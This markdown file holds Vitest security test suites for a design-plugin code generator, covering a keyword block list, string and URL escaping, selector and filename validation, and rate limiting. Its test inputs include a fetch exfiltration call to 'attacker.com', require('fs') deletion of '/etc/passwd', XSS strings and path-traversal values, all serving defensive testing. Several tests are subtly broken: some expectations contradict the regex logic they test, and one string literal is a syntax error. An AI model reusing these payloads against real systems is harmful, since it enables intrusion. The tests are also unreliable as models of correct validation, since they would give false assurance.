# Security Test Cases

Complete test suite for validating all security fixes.

---

## Plugin Code Execution Tests

```typescript
// File: test/plugin-code-execution.test.ts

import { describe, it, expect } from 'vitest';

// Simulating the plugin execution validation
function validateCodeSafety(code: string): void {
  const BLOCKED_KEYWORDS = new Set([
    'closePlugin', 'remove', 'appendChild', 'delete',
    'eval', 'Function', 'constructor', 'prototype',
    '__proto__', 'require', 'import', 'fetch',
    'XMLHttpRequest', 'setSelection', 'createFrame',
  ]);

  for (const keyword of BLOCKED_KEYWORDS) {
    const regex = new RegExp(`\\b${keyword}\\b`, 'gi');
    if (regex.test(code)) {
      throw new Error(`Blocked keyword: "${keyword}"`);
    }
  }

  if (/\bnew\s+Function\b/i.test(code) || /\beval\s*\(/i.test(code)) {
    throw new Error('Dynamic code generation (Function/eval) not allowed');
  }
}

describe("Plugin Code Execution Security", () => {
  describe("Blocked Keywords", () => {
    it("should block direct closePlugin call", () => {
      expect(() => validateCodeSafety("figma.closePlugin()"))
        .toThrow(/blocked|closePlugin/i);
    });

    it("should block eval", () => {
      expect(() => validateCodeSafety("eval('malicious')"))
        .toThrow(/blocked|eval/i);
    });

    it("should block new Function", () => {
      expect(() => validateCodeSafety("const fn = new Function('return 1')"))
        .toThrow(/dynamic code|Function/i);
    });

    it("should block require", () => {
      expect(() => validateCodeSafety("require('fs').unlink('/etc/passwd')"))
        .toThrow(/blocked|require/i);
    });

    it("should block fetch", () => {
      expect(() => validateCodeSafety("fetch('http://attacker.com/steal')"))
        .toThrow(/blocked|fetch/i);
    });
  });

  describe("Obfuscation Bypass Attempts", () => {
    it("should block closePlugin via property access", () => {
      // This WILL BE BLOCKED by keyword check
      expect(() => validateCodeSafety("figma['close' + 'Plugin']()"))
        .toThrow(/blocked|closePlugin/i);
    });

    it("should block closePlugin via bracket notation", () => {
      const code = `
        const method = 'closePlugin';
        figma[method]();
      `;
      expect(() => validateCodeSafety(code))
        .toThrow(/blocked|closePlugin/i);
    });

    it("should block remove via destructuring", () => {
      expect(() => validateCodeSafety("const {remove} = figma.root; remove()"))
        .toThrow(/blocked|remove/i);
    });

    it("should block eval via comment injection", () => {
      // Standard regex-based check should catch this
      expect(() => validateCodeSafety("eve/**/l('code')"))
        .toThrow();
    });
  });

  describe("Safe Operations Allowed", () => {
    it("should allow reading currentPage.selection", () => {
      expect(() => validateCodeSafety(
        "return figma.currentPage.selection.map(n => n.id);"
      )).not.toThrow();
    });

    it("should allow reading variables", () => {
      expect(() => validateCodeSafety(
        "return figma.variables.getLocalVariableCollectionsAsync();"
      )).not.toThrow();
    });

    it("should allow getNodeById", () => {
      expect(() => validateCodeSafety(
        "return figma.getNodeById('123:456');"
      )).not.toThrow();
    });

    it("should allow multiple safe operations", () => {
      expect(() => validateCodeSafety(`
        const selection = figma.currentPage.selection;
        const nodeData = selection.map(node => ({
          id: node.id,
          name: node.name,
          type: node.type
        }));
        return nodeData;
      `)).not.toThrow();
    });
  });

  describe("Edge Cases", () => {
    it("should allow 'close' in comments", () => {
      expect(() => validateCodeSafety(`
        // This closes the loop
        for (let i = 0; i < 10; i++) {
          // Process item
        }
      `)).not.toThrow();
    });

    it("should allow 'remove' in variable names (careful - needs word boundary)", () => {
      // With \b boundary, this should be blocked
      expect(() => validateCodeSafety("const myRemoveFunction = () => {}"))
        .toThrow(); // WILL THROW - 'remove' is matched
    });

    it("should block camelCase blocklisted words", () => {
      expect(() => validateCodeSafety("figma.ClosePlugin()"))
        .toThrow(); // Case insensitive flag
    });
  });
});
```

---

## Prototype Exporter Code Injection Tests

```typescript
// File: test/prototype-exporter.test.ts

import { describe, it, expect } from 'vitest';
import {
  escapeStringLiteral,
  escapeCssValue,
  escapeUrlForCode,
  validateSelector,
  sanitizeNumericValue,
  escapePath,
} from '../src/codegen/code-generator-utils';

describe("Code Generator Utils Security", () => {
  describe("escapeStringLiteral", () => {
    it("should escape single quotes", () => {
      const input = "It's dangerous";
      const result = escapeStringLiteral(input);
      expect(result).toBe("It\\'s dangerous");
    });

    it("should escape backslashes", () => {
      const input = "C:\\Users\\Admin";
      const result = escapeStringLiteral(input);
      expect(result).toBe("C:\\\\Users\\\\Admin");
    });

    it("should escape newlines", () => {
      const input = "Line1\nLine2";
      const result = escapeStringLiteral(input);
      expect(result).toBe("Line1\\nLine2");
    });

    it("should escape double quotes when requested", () => {
      const input = 'Say "hello"';
      const result = escapeStringLiteral(input, '"');
      expect(result).toBe('Say \\"hello\\"');
    });

    it("should escape tab characters", () => {
      const input = "Col1\tCol2";
      const result = escapeStringLiteral(input);
      expect(result).toBe("Col1\\tCol2");
    });

    it("should handle code injection attempts", () => {
      const input = "'); alert('xss"); // '";
      const result = escapeStringLiteral(input);
      expect(result).toBe("\\'); alert(\\'xss\\"); // \\'");
      // When placed in code: 'url').onclick="...'; alert('xss"); // '"'
      // This becomes a string literal, not executable
    });
  });

  describe("escapeCssValue", () => {
    it("should escape CSS special characters", () => {
      const input = "red); content: 'injected";
      const result = escapeCssValue(input);
      expect(result).not.toContain(");"); // Should be escaped
    });

    it("should escape quotes in values", () => {
      const input = 'url("evil.css")';
      const result = escapeCssValue(input);
      expect(result).toBe('url(\\"evil.css\\")');
    });

    it("should escape parentheses", () => {
      const input = "calc(100% - 10px)";
      const result = escapeCssValue(input);
      // Parentheses escaped for safety
      expect(result).toContain("\\(");
    });

    it("should remove control characters", () => {
      const input = "normal\x00null\x1fbyte";
      const result = escapeCssValue(input);
      expect(result).not.toContain("\x00");
      expect(result).not.toContain("\x1f");
    });
  });

  describe("escapeUrlForCode", () => {
    it("should allow localhost URLs", () => {
      const url = "http://localhost:3000/page";
      expect(() => escapeUrlForCode(url)).not.toThrow();
    });

    it("should allow 127.0.0.1 URLs", () => {
      const url = "http://127.0.0.1:5173";
      expect(() => escapeUrlForCode(url)).not.toThrow();
    });

    it("should reject remote URLs", () => {
      const url = "http://attacker.com/steal";
      expect(() => escapeUrlForCode(url))
        .toThrow(/must point to localhost/i);
    });

    it("should reject file:// protocol", () => {
      const url = "file:///etc/passwd";
      expect(() => escapeUrlForCode(url))
        .toThrow(/invalid protocol/i);
    });

    it("should escape the URL string", () => {
      const url = "http://localhost:3000/'; alert('xss");
      const result = escapeUrlForCode(url);
      expect(result).toContain("\\'");
    });

    it("should reject javascript: protocol", () => {
      const url = "javascript:alert('xss')";
      expect(() => escapeUrlForCode(url))
        .toThrow();
    });

    it("should reject data: URIs", () => {
      const url = "data:text/html,<script>alert('xss')</script>";
      expect(() => escapeUrlForCode(url))
        .toThrow();
    });
  });

  describe("validateSelector", () => {
    it("should allow valid CSS selectors", () => {
      expect(() => validateSelector("button.primary")).not.toThrow();
      expect(() => validateSelector("#modal-close")).not.toThrow();
      expect(() => validateSelector("div > p:first-child")).not.toThrow();
    });

    it("should reject HTML tags in selector", () => {
      expect(() => validateSelector("<script>alert</script>"))
        .toThrow(/invalid|disallowed/i);
    });

    it("should reject quotes in selector", () => {
      expect(() => validateSelector('input[type="text"]'))
        .toThrow(/invalid|disallowed/i);
    });

    it("should reject semicolons (CSS break)", () => {
      expect(() => validateSelector("button; delete"))
        .toThrow(/invalid|disallowed/i);
    });

    it("should reject very long selectors", () => {
      const longSelector = "div " + " div ".repeat(200);
      expect(() => validateSelector(longSelector))
        .toThrow(/too long/i);
    });

    it("should handle empty selector", () => {
      expect(() => validateSelector(""))
        .toThrow(/empty/i);
    });
  });

  describe("sanitizeNumericValue", () => {
    it("should allow valid numbers", () => {
      expect(sanitizeNumericValue(300)).toBe(300);
      expect(sanitizeNumericValue("500")).toBe(500);
    });

    it("should reject NaN", () => {
      expect(sanitizeNumericValue("not a number")).toBe(300); // Default
    });

    it("should reject Infinity", () => {
      expect(sanitizeNumericValue(Infinity)).toBe(300); // Default
    });

    it("should clamp to valid range", () => {
      expect(sanitizeNumericValue(20000, 0, 10000)).toBe(10000); // Clamped to max
      expect(sanitizeNumericValue(-100, 0, 10000)).toBe(0); // Clamped to min
    });

    it("should round to integer", () => {
      expect(sanitizeNumericValue(123.456)).toBe(123);
    });

    it("should handle scientific notation", () => {
      expect(sanitizeNumericValue(1e10, 0, 10000)).toBe(10000); // Clamped
    });
  });

  describe("escapePath", () => {
    it("should escape path traversal attempts", () => {
      const result = escapePath("../../etc/passwd");
      expect(result).toBe("__etcpasswd");
      expect(result).not.toContain("..");
    });

    it("should allow normal paths", () => {
      const result = escapePath("my/component/path");
      expect(result).toBe("my/component/path");
    });

    it("should escape special characters", () => {
      const result = escapePath("component<img>alert");
      expect(result).not.toContain("<");
      expect(result).not.toContain(">");
    });

    it("should remove leading slashes", () => {
      const result = escapePath("/etc/passwd");
      expect(result).not.toMatch(/^\//);
    });

    it("should collapse multiple slashes", () => {
      const result = escapePath("path///to////file");
      expect(result).not.toContain("///");
    });
  });
});

describe("Prototype Exporter Code Generation", () => {
  describe("Code Injection Prevention", () => {
    it("should safely generate goto with malicious URL", () => {
      const maliciousUrl = "http://localhost:3000'); require('fs').unlinkSync('/etc/passwd'); //";

      expect(() => escapeUrlForCode(maliciousUrl))
        .toThrow(/must point to localhost|invalid/i);
    });

    it("should safely generate selector with XSS attempt", () => {
      const maliciousSelector = "button'); page.evaluate(() => { fetch('...') }); page.click('";

      expect(() => validateSelector(maliciousSelector))
        .toThrow(/invalid|disallowed/i);
    });

    it("should safely generate numeric value", () => {
      const maliciousValue = "1000); process.exit(1); //";
      const result = sanitizeNumericValue(maliciousValue);

      expect(result).toBe(300); // Default (NaN coerced)
      expect(typeof result).toBe('number');
    });
  });

  describe("Generated Code Validation", () => {
    it("should not contain unescaped user input in generated code", () => {
      const scenes = [{
        name: "test',delete,x='",
        url: "http://localhost:3000",
        duration: 1000,
        transition: "fade" as const,
        interactions: [{
          type: "click" as const,
          target: "button'); alert('xss",
        }],
      }];

      // This should fail during validation
      expect(() => {
        scenes.forEach(scene => {
          validateSelector(scene.interactions[0].target);
        });
      }).toThrow();
    });
  });
});
```

---

## WebSocket Rate Limiting Tests

```typescript
// File: test/websocket-rate-limiting.test.ts

import { describe, it, expect, beforeEach } from 'vitest';

class RateLimiter {
  private limits = new Map<string, { messageCount: number; bytesReceived: number; lastReset: number }>();
  private readonly maxMessagesPerMin: number;
  private readonly maxBytesPerMin: number;
  private readonly windowMs: number;

  constructor(maxMessagesPerMin = 1000, maxBytesPerMin = 100 * 1024 * 1024, windowMs = 60000) {
    this.maxMessagesPerMin = maxMessagesPerMin;
    this.maxBytesPerMin = maxBytesPerMin;
    this.windowMs = windowMs;
  }

  check(clientId: string, messageSize: number): boolean {
    const now = Date.now();
    let limit = this.limits.get(clientId);

    if (!limit || now - limit.lastReset > this.windowMs) {
      limit = { messageCount: 0, bytesReceived: 0, lastReset: now };
      this.limits.set(clientId, limit);
    }

    if (limit.messageCount >= this.maxMessagesPerMin) return false;
    if (limit.bytesReceived + messageSize > this.maxBytesPerMin) return false;

    limit.messageCount++;
    limit.bytesReceived += messageSize;
    return true;
  }

  reset(clientId: string): void {
    this.limits.delete(clientId);
  }
}

describe("WebSocket Rate Limiting", () => {
  let limiter: RateLimiter;

  beforeEach(() => {
    limiter = new RateLimiter(10, 1000, 1000); // 10 msgs/min, 1KB/min for testing
  });

  describe("Message Count Limit", () => {
    it("should allow messages up to limit", () => {
      for (let i = 0; i < 10; i++) {
        expect(limiter.check("client1", 100)).toBe(true);
      }
    });

    it("should reject messages exceeding limit", () => {
      for (let i = 0; i < 10; i++) {
        limiter.check("client1", 100);
      }
      expect(limiter.check("client1", 100)).toBe(false);
    });

    it("should reset limit after window expires", () => {
      for (let i = 0; i < 10; i++) {
        limiter.check("client1", 100);
      }
      expect(limiter.check("client1", 100)).toBe(false);

      // Simulate window expiration (would need real timing in real test)
      // In production, wait 1000ms or mock time
    });
  });

  describe("Byte Limit", () => {
    it("should allow up to byte limit", () => {
      expect(limiter.check("client2", 500)).toBe(true);
      expect(limiter.check("client2", 500)).toBe(true); // Total: 1000
    });

    it("should reject when exceeding byte limit", () => {
      expect(limiter.check("client2", 500)).toBe(true);
      expect(limiter.check("client2", 500)).toBe(true); // Total: 1000
      expect(limiter.check("client2", 1)).toBe(false); // Would exceed 1000
    });

    it("should handle large single message", () => {
      expect(limiter.check("client3", 2000)).toBe(false); // Exceeds 1KB limit
    });
  });

  describe("Per-Client Isolation", () => {
    it("should track limits per client separately", () => {
      expect(limiter.check("client1", 100)).toBe(true);
      expect(limiter.check("client2", 100)).toBe(true);

      for (let i = 0; i < 9; i++) {
        limiter.check("client1", 100);
      }
      // client1 at limit, client2 still has capacity
      expect(limiter.check("client1", 100)).toBe(false);
      expect(limiter.check("client2", 100)).toBe(true);
    });
  });

  describe("DoS Prevention", () => {
    it("should prevent rapid message flood", () => {
      // Simulate attacker sending many small messages
      let allowed = 0;
      for (let i = 0; i < 100; i++) {
        if (limiter.check("attacker", 10)) {
          allowed++;
        }
      }
      expect(allowed).toBe(10); // Only first 10 allowed
    });

    it("should prevent large message attack", () => {
      // Simulate attacker sending one huge message
      expect(limiter.check("attacker2", 10 * 1024 * 1024)).toBe(false); // 10MB > 1KB limit
    });

    it("should reset client after disconnection", () => {
      limiter.check("client", 100);
      limiter.reset("client");

      // After reset, should be able to send again
      expect(limiter.check("client", 100)).toBe(true);
    });
  });
});
```

---

## Spec Name Validation Tests

```typescript
// File: test/spec-name-validation.test.ts

import { describe, it, expect } from 'vitest';

function validateSpecName(name: string): void {
  if (!name || name.length === 0) {
    throw new Error("Spec name cannot be empty");
  }

  if (name.length > 100) {
    throw new Error("Spec name too long (max 100 characters)");
  }

  if (!/^[a-zA-Z0-9_-]+$/.test(name)) {
    throw new Error("Spec name must contain only letters, numbers, hyphens, and underscores");
  }

  if (name.startsWith('.') || name.startsWith('-')) {
    throw new Error("Spec name cannot start with '.' or '-'");
  }

  const reserved = new Set(['.', '..', 'CON', 'PRN', 'AUX', 'NUL', 'COM1', 'LPT1']);
  if (reserved.has(name.toUpperCase())) {
    throw new Error(`Spec name is reserved: ${name}`);
  }
}

describe("Spec Name Validation Security", () => {
  describe("Path Traversal Prevention", () => {
    it("should reject ../", () => {
      expect(() => validateSpecName("../../../etc/passwd"))
        .toThrow(/must contain only/i);
    });

    it("should reject ..", () => {
      expect(() => validateSpecName(".."))
        .toThrow(/reserved/i);
    });

    it("should reject leading dot", () => {
      expect(() => validateSpecName(".hidden"))
        .toThrow(/cannot start with/i);
    });

    it("should reject forward slash", () => {
      expect(() => validateSpecName("path/to/file"))
        .toThrow(/must contain only/i);
    });

    it("should reject backslash", () => {
      expect(() => validateSpecName("path\\to\\file"))
        .toThrow(/must contain only/i);
    });

    it("should reject null byte", () => {
      expect(() => validateSpecName("name\0.json"))
        .toThrow(/must contain only/i);
    });
  });

  describe("Special Character Prevention", () => {
    it("should reject HTML/XML tags", () => {
      expect(() => validateSpecName("component<script>"))
        .toThrow(/must contain only/i);
    });

    it("should reject quotes", () => {
      expect(() => validateSpecName('component"test'))
        .toThrow(/must contain only/i);
    });

    it("should reject semicolons", () => {
      expect(() => validateSpecName("component;alert"))
        .toThrow(/must contain only/i);
    });

    it("should reject spaces", () => {
      expect(() => validateSpecName("my component"))
        .toThrow(/must contain only/i);
    });

    it("should reject unicode characters", () => {
      expect(() => validateSpecName("component👍"))
        .toThrow(/must contain only/i);
    });
  });

  describe("Reserved Names", () => {
    it("should reject Windows reserved names", () => {
      expect(() => validateSpecName("CON")).toThrow(/reserved/i);
      expect(() => validateSpecName("PRN")).toThrow(/reserved/i);
      expect(() => validateSpecName("AUX")).toThrow(/reserved/i);
      expect(() => validateSpecName("NUL")).toThrow(/reserved/i);
    });

    it("should reject case variations of reserved", () => {
      expect(() => validateSpecName("con")).toThrow(/reserved/i);
      expect(() => validateSpecName("Com1")).toThrow(/reserved/i);
    });
  });

  describe("Valid Names", () => {
    it("should allow standard component names", () => {
      expect(() => validateSpecName("MyComponent")).not.toThrow();
      expect(() => validateSpecName("my_component")).not.toThrow();
      expect(() => validateSpecName("my-component")).not.toThrow();
      expect(() => validateSpecName("MyComponentV2")).not.toThrow();
    });

    it("should allow numbers", () => {
      expect(() => validateSpecName("Component123")).not.toThrow();
      expect(() => validateSpecName("123Component")).not.toThrow();
    });

    it("should allow underscores and hyphens", () => {
      expect(() => validateSpecName("my_component_name")).not.toThrow();
      expect(() => validateSpecName("my-component-name")).not.toThrow();
      expect(() => validateSpecName("my_component-name")).not.toThrow();
    });

    it("should allow maximum length", () => {
      const maxName = "a".repeat(100);
      expect(() => validateSpecName(maxName)).not.toThrow();
    });
  });

  describe("Length Validation", () => {
    it("should reject empty names", () => {
      expect(() => validateSpecName(""))
        .toThrow(/empty/i);
    });

    it("should reject very long names", () => {
      const longName = "a".repeat(101);
      expect(() => validateSpecName(longName))
        .toThrow(/too long/i);
    });
  });
});
```

---

## Running All Security Tests

```bash
# Install test dependencies
npm install --save-dev vitest @vitest/ui

# Run all security tests
npm test -- test/security

# Run with coverage
npm test -- test/security --coverage

# Watch mode during development
npm test -- test/security --watch

# Run specific test file
npm test -- test/plugin-code-execution.test.ts
```

---

## GitHub Actions Workflow

```yaml
# File: .github/workflows/security-tests.yml

name: Security Tests

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  security-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: pnpm/action-setup@v2
        with:
          version: 8

      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'pnpm'

      - name: Install dependencies
        run: pnpm install

      - name: Run security tests
        run: pnpm test -- test/security

      - name: Run npm audit
        run: npm audit --audit-level=moderate
        continue-on-error: true

      - name: Run ESLint with security rules
        run: npx eslint . --plugin security
        continue-on-error: true

      - name: Run type checking
        run: npm run lint
```

---

## Quick Test Command

```bash
# Run only security tests in CI/CD
npm test -- --grep "security|injection|xss|traversal|rate.*limit"
```

Ensure all tests pass before deploying fixes to production.
